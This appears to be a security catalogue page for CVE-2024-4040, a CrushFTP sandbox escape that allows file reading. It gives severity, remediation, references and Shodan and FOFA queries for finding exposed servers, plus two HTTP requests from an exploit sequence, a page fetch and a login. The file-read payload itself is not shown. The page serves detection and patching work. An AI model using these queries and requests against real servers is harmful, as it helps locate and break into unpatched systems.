---
layout: "post"
cve_id: "CVE-2024-4040"
title: "CrushFTP VFS - Sandbox Escape LFR"
pcap: true
pcap_path: "/pcaps/2024/CVE-2024-4040.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2024/CVE-2024-4040.yaml"
author: "DhiyaneshDK,pussycat0x"
severity: "critical"
impact: "Successful exploitation could lead to unauthorized access to sensitive data.
"
remediation: "Apply the vendor-supplied patch or upgrade to the latest version to mitigate CVE-2024-4040.
"
reference:
  - "https://www.bleepingcomputer.com/news/security/crushftp-warns-users-to-patch-exploited-zero-day-immediately/"
  - "https://www.crushftp.com/crush10wiki/Wiki.jsp?page=Update"
  - "https://www.reddit.com/r/crowdstrike/comments/1c88788/situational_awareness_20240419_crushftp_virtual/"
  - "https://www.reddit.com/r/cybersecurity/comments/1c850i2/all_versions_of_crush_ftp_are_vulnerable/"
classification:
  cvss-metrics: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H"
  cvss-score: 10
  cve-id: "CVE-2024-4040"
  cwe-id: "CWE-94,CWE-1336"
  epss-score: 0.94426
  epss-percentile: 0.99981
  cpe: "cpe:2.3:a:crushftp:crushftp:*:*:*:*:*:*:*:*"
metadata:
  verified: True
  max-request: 5
  vendor: "crushftp"
  product: "crushftp"
  shodan-query: ['html:"CrushFTP"', 'http.html:"crushftp"']
  fofa-query: "body=\"crushftp\""
tags:
  - "cve"
  - "cve2024"
  - "lfr"
  - "crushftp"
  - "vfs"
  - "kev"
  - "vkev"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---


## üîç Vulnerability Description
VFS Sandbox Escape in CrushFTP in all versions before 10.7.1 and 11.1.0 on all platforms allows remote attackers with low privileges to read files from the filesystem outside of VFS Sandbox.


## üåê HTTP Request
```nohighlight
GET /WebInterface/ HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; ja-JP) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4
Connection: close
Accept-Encoding: gzip
```

```nohighlight
POST /WebInterface/function/ HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0
Connection: close
Content-Length: 99
Origin: /
Referer: http:////WebInterface/login.html
Accept-Encoding: gzip

command=login&username=isRXve&password=0EwSAxo4&encoded=true&language=en&random=0.34712915617878926
```


